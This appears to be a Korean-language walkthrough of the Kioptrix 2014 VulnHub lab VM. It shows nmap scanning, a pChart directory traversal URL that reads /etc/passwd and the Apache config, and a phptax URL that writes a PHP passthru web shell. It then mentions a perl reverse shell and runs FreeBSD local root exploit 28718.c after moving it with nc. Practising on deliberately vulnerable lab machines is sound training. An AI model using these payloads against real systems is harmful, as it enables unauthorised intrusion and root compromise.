[Kioptrix : 2014](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open   
![1](https://user-images.githubusercontent.com/69203345/109299337-48ef8f00-7878-11eb-9600-82714c90917d.PNG)

# enumerate + exploitation
***
## target: 192.168.25.14
### nmap -O -sV -sS -p- 192.168.25.14
![2](https://user-images.githubusercontent.com/69203345/109299834-11cdad80-7879-11eb-9b78-a8db342b9dd1.PNG)
192.168.25.14 에 소스중 일부이다   
![3](https://user-images.githubusercontent.com/69203345/109300005-4d687780-7879-11eb-8f89-825772b2f224.PNG)
### searchsploit pChart
![4](https://user-images.githubusercontent.com/69203345/109300086-6ffa9080-7879-11eb-931c-a341d776a2ae.PNG)
### cat /usr/share/exploitdb/exploits/php/webapps/31173.txt    
![5](https://user-images.githubusercontent.com/69203345/109300262-a3d5b600-7879-11eb-93b9-5590127ba414.PNG)    
Directory Traversal 을 이용 할수 있을것 같다.   
### 192.168.25.14/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd    
![6](https://user-images.githubusercontent.com/69203345/109300605-0dee5b00-787a-11eb-8436-222557bbeaab.PNG)   
[참고자료](https://docs.freebsd.org/en/books/handbook/network-servers/#network-apache)   
### 192.168.25.14/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf      
다음 페이지중 일부이다       
![7](https://user-images.githubusercontent.com/69203345/109301393-3cb90100-787b-11eb-8ac4-891aab7b8214.PNG)     
Allow from env=Mozilla4_browser 라고 적힌것을 볼수 있다.     
burfsuite 를 이용해서 들어가도록 하자
#### Proxy > Options 에서 사용자를 바꿀수 있다.   
사용자를 바꾼뒤 192.168.25.14:8080 에 들어갔다   
![8](https://user-images.githubusercontent.com/69203345/109302018-1778c280-787c-11eb-96ed-b6a3981a9ec3.PNG)   
phptax 페이지는 취약점이 존재한다 [exploit-db](https://www.exploit-db.com/exploits/25849)   
### {$url}/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E 
### {$url}/data/rce.php?cmd=id 
![9](https://user-images.githubusercontent.com/69203345/109305877-b7851a80-7881-11eb-9773-b72086b7a82b.PNG)    
### {$url}/data/rce.php?cmd= perl reverse shell cheat sheet 이용       
![10](https://user-images.githubusercontent.com/69203345/109308306-2ca61f00-7885-11eb-83d3-fb3eb0ff34c6.PNG)   
이제 root로 권한 상승만 하면 된다.     

# privilege escalation 
***   
### uname -a
### searchsploit freebsd 9.0
![11](https://user-images.githubusercontent.com/69203345/109308564-8870a800-7885-11eb-9b79-6437ec7647af.PNG)
28718.c 이용하도록 하자    
### nc -nvlp 7777 < 28718.c
nc를 이용한 파일전송이다( 다른 포트를 열어서 nc -nv ip port > 28718.c)     
### gcc -o exploit 28718.c 
### ./exploit 
![12](https://user-images.githubusercontent.com/69203345/109310157-83acf380-7887-11eb-9cb8-fc392dc01bf0.PNG)


root획득   
꼭 이방법만 있는것은 아니다.
으악.
***
이번 vm을 풀면서 도움이된 블로그[블로그](https://nandtech.co/2017/07/20/penetration-testing-practice-hacking-kioptrix-2014//)   
FreeBSD에서 기본 Apache HTTP Server 구성 파일은 /usr/local/etc/apache2x/httpd.conf 로 설치된다 . 여기서 x 는 버전 번호    
[reverse-shell-cheat-sheet](https://www.ethicalhackx.com/reverse-shell-cheat-sheet/)
